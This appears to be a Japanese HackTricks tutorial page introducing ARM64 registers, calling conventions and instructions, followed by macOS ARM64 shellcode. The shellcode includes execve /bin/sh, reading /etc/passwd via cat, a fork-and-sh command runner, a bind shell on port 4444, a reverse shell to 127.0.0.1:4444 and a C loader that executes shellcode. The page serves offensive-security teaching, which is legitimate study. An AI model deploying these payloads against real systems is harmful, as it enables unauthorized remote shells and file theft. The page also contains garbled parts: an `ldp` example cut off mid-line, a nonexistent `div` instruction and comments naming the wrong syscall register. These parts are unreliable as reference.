# ARM64の概要

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

## **ARM64の概要**

ARM64、またはARMv8-Aは、スマートフォン、タブレット、サーバー、さらには一部のハイエンドパーソナルコンピュータ（macOS）など、さまざまなタイプのデバイスで使用される64ビットプロセッサアーキテクチャです。これは、省電力なプロセッサ設計で知られる企業であるARM Holdingsの製品です。

### **レジスタ**

ARM64には、`x0`から`x30`までの**31個の汎用レジスタ**があります。各レジスタは**64ビット（8バイト）**の値を格納できます。32ビットの値のみを必要とする操作では、同じレジスタには`w0`から`w30`までの名前で32ビットモードでアクセスできます。

1. **`x0`**から**`x7`** - これらは通常、スクラッチレジスタとサブルーチンへのパラメータの渡しに使用されます。
* **`x0`**は関数の戻り値も保持します。
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`**から**`x15`** - 一時レジスタであり、ローカル変数によく使用されます。
4. **`x16`**と**`x17`** - 一時レジスタであり、間接関数呼び出しやPLT（Procedure Linkage Table）スタブにも使用されます。
* **`x16`**は**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - プラットフォームレジスタです。一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています。
6. **`x19`**から**`x28`** - これらは呼び出し元のために値を保持する必要がある呼び出し先保存レジスタです。
7. **`x29`** - **フレームポインタ**。
8. **`x30`** - リンクレジスタ。`BL`（Branch with Link）または`BLR`（Branch with Link to Register）命令が実行されるときに返されるアドレスを保持します。
9. **`sp`** - **スタックポインタ**で、スタックの先頭を追跡するために使用されます。
10. **`pc`** - 次に実行される命令を指す**プログラムカウンタ**です。

### **呼び出し規約**

ARM64の呼び出し規約では、関数への最初の8つのパラメータはレジスタ**`x0`から`x7`**に渡されます。**追加の**パラメータは**スタック**に渡されます。**戻り値**はレジスタ**`x0`**に返されます。128ビットの場合は**`x1`**にも返されます。**`x19`**から**`x30`**と**`sp`**レジスタは、関数呼び出しの間に**保存**する必要があります。

アセンブリで関数を読む場合は、**関数のプロローグとエピローグ**を探します。**プロローグ**では通常、**フレームポインタ（`x29`）を保存**し、**新しいフレームポインタを設定**し、**スタックスペースを割り当て**ます。**エピローグ**では通常、**保存されたフレームポインタを復元**し、関数から**戻ります**。

### **一般的な命令**

ARM64の命令は一般的に**`opcode dst, src1, src2`**の形式を持ちます。ここで、**`opcode`**は実行する**操作**（`add`、`sub`、`mov`など）を示し、**`dst`**は結果が格納される**宛先**レジスタ、**`src1`**と**`src2`**は**ソース**レジスタです。ソースレジスタの代わりに即値を使用することもできます。

* **`mov`**: 1つの**レジスタ**から別の**レジスタ**に値を**移動**します。
* 例: `mov x0, x1` — これは`x1`から`x0`に値を移動します。
* **`ldr`**: **メモリ**から値を**レジスタ**に**ロード**します。
* 例: `ldr x0, [x1]` — これは`x1`が指すメモリ位置から値を`x0`にロードします。
* **`str`**: **レジスタ**の値を**メモリ**に**ストア**します。
* 例: `str x0, [x1]` — これは`x0`の値を`x1`が指すメモリ位置にストアします。
* **`ldp`**: **レジスタのペア**を**連続するメモリ**から**ロード**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えることで形成されます。
* 例: `ldp x0, x1, [
* **`mul`**: **2つのレジスタ**の値を**掛け算**し、結果をレジスタに格納します。
* 例: `mul x0, x1, x2` — これは`x1`と`x2`の値を掛け算し、結果を`x0`に格納します。
* **`div`**: 1つのレジスタの値を別のレジスタで割り、結果をレジスタに格納します。
* 例: `div x0, x1, x2` — これは`x1`を`x2`で割り、結果を`x0`に格納します。
* **`bl`**: **リンク付き分岐**で、**サブルーチン**を**呼び出します**。**戻りアドレスを`x30`に格納**します。
* 例: `bl myFunction` — これは`myFunction`関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`blr`**: **レジスタで指定された**ターゲットの**サブルーチン**を**呼び出します**。**戻りアドレスを`x30`に格納**します。
* 例: `blr x1` — これは`x1`に格納されたアドレスの関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`ret`**: **サブルーチンから戻ります**。通常は**`x30`のアドレス**を使用します。
* 例: `ret` — これは現在のサブルーチンから`x30`の戻りアドレスを使用して戻ります。
* **`cmp`**: 2つのレジスタを比較し、条件フラグを設定します。
* 例: `cmp x0, x1` — これは`x0`と`x1`の値を比較し、条件フラグを適切に設定します。
* **`b.eq`**: **等しい場合に分岐**します。前の`cmp`命令に基づきます。
* 例: `b.eq label` — 前の`cmp`命令で2つの値が等しい場合、`label`にジャンプします。
* **`b.ne`**: **等しくない場合に分岐**します。この命令は条件フラグをチェックし（前の比較命令で設定された）、比較された値が等しくない場合はラベルまたはアドレスに分岐します。
* 例: `cmp x0, x1`の後、`b.ne label` — `x0`と`x1`の値が等しくない場合、`label`にジャンプします。
* **`cbz`**: **ゼロの場合に比較して分岐**します。この命令はレジスタとゼロを比較し、等しい場合はラベルまたはアドレスに分岐します。
* 例: `cbz x0, label` — `x0`の値がゼロの場合、`label`にジャンプします。
* **`cbnz`**: **ゼロでない場合に比較して分岐**します。この命令はレジスタとゼロを比較し、等しくない場合はラベルまたはアドレスに分岐します。
* 例: `cbnz x0, label` — `x0`の値がゼロでない場合、`label`にジャンプします。
* **`adrp`**: シンボルの**ページアドレスを計算**し、レジスタに格納します。
* 例: `adrp x0, symbol` — これは`symbol`のページアドレスを計算し、`x0`に格納します。
* **`ldrsw`**: メモリから**符号付きの32ビット**値を**64ビットに拡張して**ロードします。
* 例: `ldrsw x0, [x1]` — これは`x1`が指すメモリ位置から符号付きの32ビット値をロードし、64ビットに拡張して`x0`に格納します。
* **`stur`**: レジスタの値をメモリの場所に**ストア**します。別のレジスタからのオフセットを使用します。
* 例: `stur x0, [x1, #4]` — これは`x1`に現在格納されているアドレスよりも4バイト大きいメモリアドレスに`x0`の値を格納します。
* **`svc`**: **システムコール**を行います。"Supervisor Call"の略です。プロセッサがこの命令を実行すると、ユーザーモードからカーネルモードに切り替わり、カーネルのシステムコール処理コードが配置されている特定のメモリ位置にジャンプします。
* 例:

```armasm
mov x8, 93  ; システムコール番号（exitの場合は93）をレジスタx8にロードします。
mov x0, 0   ; 終了ステータスコード（0）をレジスタx0にロードします。
svc 0       ; システムコールを実行します。
```

### **関数プロローグ**

1. **リンクレジスタとフレームポインタをスタックに保存**します：

```armasm
stp x29, x30, [sp, #-16]!  ; ペアx29とx30をスタックに保存し、スタックポインタをデクリメントします。
```

2. **新しいフレームポインタを設定**します：`mov x29, sp`（現在の関数のために新しいフレームポインタを設定します）
3. **ローカル変数のためにスタック上にスペースを確保**します（必要な場合）：`sub sp, sp, <size>`（`<size>`は必要なバイト数です）

### **関数エピローグ**

1. **ローカル変数を解放**します（割り当てられている場合）：`add sp, sp, <size>`
2. **リンクレジスタとフレームポインタを復元**します：

```armasm
ldp x29, x30, [sp], #16  ; ペアx29とx30をスタックから復元し、スタックポインタをインクリメントします。
```

3. **戻ります**：`ret`（リンクレジスタのアドレスを使用して呼び出し元に制御を返します）

## macOS

### syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を参照してください。

### シェルコード

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から引用し、説明します。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="スタックを使用して" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### catコマンドで読む

目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、第2引数（x1）はパラメータの配列である必要があります（メモリ上ではアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す

Sometimes, when executing a command in a forked process, the main process gets terminated. To avoid this, you can use the `sh` command to invoke the desired command. This way, the main process will not be killed.

時には、フォークされたプロセスでコマンドを実行すると、メインプロセスが終了してしまうことがあります。これを避けるために、`sh`コマンドを使用して目的のコマンドを呼び出すことができます。これにより、メインプロセスは終了されません。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

バインドシェルは、[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) から取得できます。ポート番号は **4444** です。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### リバースシェル

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) から、**127.0.0.1:4444** へのリバースシェルを取得します。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
